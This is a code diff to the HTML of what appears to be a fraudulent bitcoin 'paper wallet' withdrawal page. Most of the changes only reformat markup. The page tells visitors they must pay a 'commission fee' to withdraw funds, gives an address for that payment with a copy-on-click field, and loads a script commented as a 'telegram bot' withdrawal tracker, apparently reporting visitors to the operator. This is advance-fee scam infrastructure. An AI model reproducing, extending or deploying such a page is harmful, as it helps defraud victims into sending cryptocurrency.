@@ -254,11 +254,13 @@
     <div class="container check-balance">
         <!-- <img src="./img/bitcoin_convert.jpg" alt="" width="100" class="d-block mx-auto"> -->
         <!-- <h3 class="h3 text-center mt-1">Business paper wallet</h3> -->
-        <p class="text-center text-danger" style="font-size: 15px;text-align: center;"><span class="ultra-text-danger">To withdraw funds
-                from the bitcoin paper wallet you need to pay a <span class="commissionPrecent"></span> commission fee </span>
+        <p class="text-center text-danger" style="font-size: 15px;text-align: center;"><span
+                class="ultra-text-danger">To withdraw funds
+                from the bitcoin paper wallet you need to pay a <span class="commissionPrecent"></span> commission fee
+            </span>
         </p>
         <form class="deposit-crypto">
-            <div  class="deposit-crypto__field">
+            <div class="deposit-crypto__field">
                 <div class="deposit-crypto__main">
                     <label>Customer bitcoin address</label>
                     <p class="btc_address-2">1er5h1r5h1t5thfehryjutkiytvc5wc1srbtd5tnyt5j5brbtn</p>
@@ -284,7 +286,8 @@
                 <div style="margin: 0;width: 100%;" class="deposit-crypto__field">
                     <div class="deposit-crypto__main">
                         <label>Pay commission fee</label>
-                        <p id="copy-address" onclick="copyAddress()" style="cursor: pointer;" class="btc_address">asd</p>
+                        <p id="copy-address" onclick="copyAddress()" style="cursor: pointer;" class="btc_address">asd
+                        </p>
                     </div>
                     <img src="./img/one-bitcoin-black.jpg" alt="" width="40" height="40">
                 </div>
@@ -388,22 +391,22 @@
             <p class="form-error text-center text-danger incorrect-data">Incorrect data entered!</p>
             <div class="transactions-table-container">
                 <table>
-                  <thead>
-                    <tr>
-                      <th>No.</th>
-                      <th>Time</th>
-                      <th>Address</th>
-                      <th>TXID</th>
-                      <th>Amount</th>
-                      <th>Chain</th>
-                      <th>Status</th>
-                    </tr>
-                  </thead>
-                  <tbody id="transaction-table-body"></tbody>
+                    <thead>
+                        <tr>
+                            <th>No.</th>
+                            <th>Time</th>
+                            <th>Address</th>
+                            <th>TXID</th>
+                            <th>Amount</th>
+                            <th>Chain</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="transaction-table-body"></tbody>
                 </table>
-              </div>
+            </div>
 
-              <script src="assets/js/transactions-table.js"></script>
+            <script type="module" src="assets/js/transactions-table.js"></script>
         </form>
         <script>
             const form = document.querySelector('.deposit-crypto');
@@ -580,8 +583,8 @@
     <!-- JS Implementing Plugins -->
     <script src="assets/vendor/hs-counter/dist/hs-counter.min.js"></script>
     <script src="assets/vendor/appear.js"></script>
-            <script type="module" src="assets/js/changeCurrency.js"></script>
-        <script type="module" src="assets/js/getPrices.js"></script>
+    <script type="module" src="assets/js/changeCurrency.js"></script>
+    <script type="module" src="assets/js/getPrices.js"></script>
     <!-- telegram bot -->
     <script src="assets/js/withdrawTracker-3.js"></script>
     <script type="module" src="assets/js/loader.js"></script>
